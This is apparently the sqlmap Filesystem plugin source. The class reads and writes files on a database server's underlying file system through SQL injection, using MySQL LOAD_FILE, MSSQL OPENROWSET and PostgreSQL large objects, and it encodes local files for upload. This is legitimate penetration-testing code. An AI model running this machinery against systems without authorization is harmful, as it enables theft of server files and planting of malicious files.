#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import codecs
import os
import sys

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import dataToOutFile
from lib.core.common import decloakToTemp
from lib.core.common import decodeDbmsHexValue
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import isStackingAvailable
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.convert import getText
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.settings import UNICODE_ENCODING
from lib.request import inject

class Filesystem(object):
    """
    This class defines generic OS file system functionalities for plugins.
    """

    def __init__(self):
        self.fileTblName = "%sfile" % conf.tablePrefix
        self.tblField = "data"

    def _checkFileLength(self, localFile, remoteFile, fileRead=False):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "LENGTH(LOAD_FILE('%s'))" % remoteFile

        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:
            lengthQuery = "SELECT SUM(LENGTH(data)) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "VARBINARY(MAX)")
            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField))

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        try:
            localFileSize = os.path.getsize(localFile)
        except OSError:
            warnMsg = "file '%s' is missing" % localFile
            logger.warn(warnMsg)
            localFileSize = 0

        if fileRead and Backend.isDbms(DBMS.PGSQL):
            logger.info("length of read file '%s' cannot be checked on PostgreSQL" % remoteFile)
            sameFile = True
        else:
            logger.debug("checking the length of the remote file '%s'" % remoteFile)
            remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
            sameFile = None

            if isNumPosStrValue(remoteFileSize):
                remoteFileSize = int(remoteFileSize)
                localFile = getUnicode(localFile, encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)
                sameFile = False

                if localFileSize == remoteFileSize:
                    sameFile = True
                    infoMsg = "the local file '%s' and the remote file " % localFile
                    infoMsg += "'%s' have the same size (%d B)" % (remoteFile, localFileSize)
                elif remoteFileSize > localFileSize:
                    infoMsg = "the remote file '%s' is larger (%d B) than " % (remoteFile, remoteFileSize)
                    infoMsg += "the local file '%s' (%dB)" % (localFile, localFileSize)
                else:
                    infoMsg = "the remote file '%s' is smaller (%d B) than " % (remoteFile, remoteFileSize)
                    infoMsg += "file '%s' (%d B)" % (localFile, localFileSize)

                logger.info(infoMsg)
            else:
                sameFile = False
                warnMsg = "it looks like the file has not been written (usually "
                warnMsg += "occurs if the DBMS process user has no write "
                warnMsg += "privileges in the destination path)"
                logger.warn(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatenate(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single, chunkSize=256):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        checkFile(fileName)

        with open(fileName, "rb") as f:
            content = f.read()

        return self.fileContentEncode(content, encoding, single, chunkSize)

    def fileContentEncode(self, content, encoding, single, chunkSize=256):
        retVal = []

        if encoding == "hex":
            content = encodeHex(content)
        elif encoding == "base64":
            content = encodeBase64(content)
        else:
            content = codecs.encode(content, encoding)

        content = getText(content).replace("\n", "")

        if not single:
            if len(content) > chunkSize:
                for i in xrange(0, len(content), chunkSize):
                    _ = content[i:i + chunkSize]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [content]

        return retVal

    def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):
        choice = None

        if forceCheck is not True:
            message = "do you want confirmation that the local file '%s' " % localFile
            message += "has been successfully written on the back-end DBMS "
            message += "file system ('%s')? [Y/n] " % remoteFile
            choice = readInput(message, default='Y', boolean=True)

        if forceCheck or choice:
            return self._checkFileLength(localFile, remoteFile)

        return True

    def askCheckReadFile(self, localFile, remoteFile):
        if not kb.bruteMode:
            message = "do you want confirmation that the remote file '%s' " % remoteFile
            message += "has been successfully downloaded from the back-end "
            message += "DBMS file system? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                return self._checkFileLength(localFile, remoteFile, True)

        return None

    def nonStackedReadFile(self, remoteFile):
        errMsg = "'nonStackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedReadFile(self, remoteFile):
        errMsg = "'stackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'unionWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'stackedWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def readFile(self, remoteFile):
        localFilePaths = []

        self.checkDbmsOs()

        for remoteFile in remoteFile.split(','):
            fileContent = None
            kb.fileReadMode = True

            if conf.direct or isStackingAvailable():
                if isStackingAvailable():
                    debugMsg = "going to read the file with stacked query SQL "
                    debugMsg += "injection technique"
                    logger.debug(debugMsg)

                fileContent = self.stackedReadFile(remoteFile)
            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "going to read the file with a non-stacked query "
                debugMsg += "SQL injection technique"
                logger.debug(debugMsg)

                fileContent = self.nonStackedReadFile(remoteFile)
            else:
                errMsg = "none of the SQL injection techniques detected can "
                errMsg += "be used to read files from the underlying file "
                errMsg += "system of the back-end %s server" % Backend.getDbms()
                logger.error(errMsg)

                fileContent = None

            kb.fileReadMode = False

            if fileContent in (None, "") and not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)
            elif isListLike(fileContent):
                newFileContent = ""

                for chunk in fileContent:
                    if isListLike(chunk):
                        if len(chunk) > 0:
                            chunk = chunk[0]
                        else:
                            chunk = ""

                    if chunk:
                        newFileContent += chunk

                fileContent = newFileContent

            if fileContent is not None:
                fileContent = decodeDbmsHexValue(fileContent, True)

                if fileContent.strip():
                    localFilePath = dataToOutFile(remoteFile, fileContent)

                    if not Backend.isDbms(DBMS.PGSQL):
                        self.cleanup(onlyFileTbl=True)

                    sameFile = self.askCheckReadFile(localFilePath, remoteFile)

                    if sameFile is True:
                        localFilePath += " (same file)"
                    elif sameFile is False:
                        localFilePath += " (size differs from remote file)"

                    localFilePaths.append(localFilePath)
                elif not kb.bruteMode:
                    errMsg = "no data retrieved"
                    logger.error(errMsg)

        return localFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        written = False

        checkFile(localFile)

        self.checkDbmsOs()

        if localFile.endswith('_'):
            localFile = getUnicode(decloakToTemp(localFile))

        if conf.direct or isStackingAvailable():
            if isStackingAvailable():
                debugMsg = "going to upload the file '%s' with " % fileType
                debugMsg += "stacked query technique"
                logger.debug(debugMsg)

            written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to upload the file '%s' with " % fileType
            debugMsg += "UNION query technique"
            logger.debug(debugMsg)

            written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)
        elif Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to upload the file '%s' with " % fileType
            debugMsg += "LINES TERMINATED BY technique"
            logger.debug(debugMsg)

            written = self.linesTerminatedWriteFile(localFile, remoteFile, fileType, forceCheck)
        else:
            errMsg = "none of the SQL injection techniques detected can "
            errMsg += "be used to write files to the underlying file "
            errMsg += "system of the back-end %s server" % Backend.getDbms()
            logger.error(errMsg)

            return None

        return written
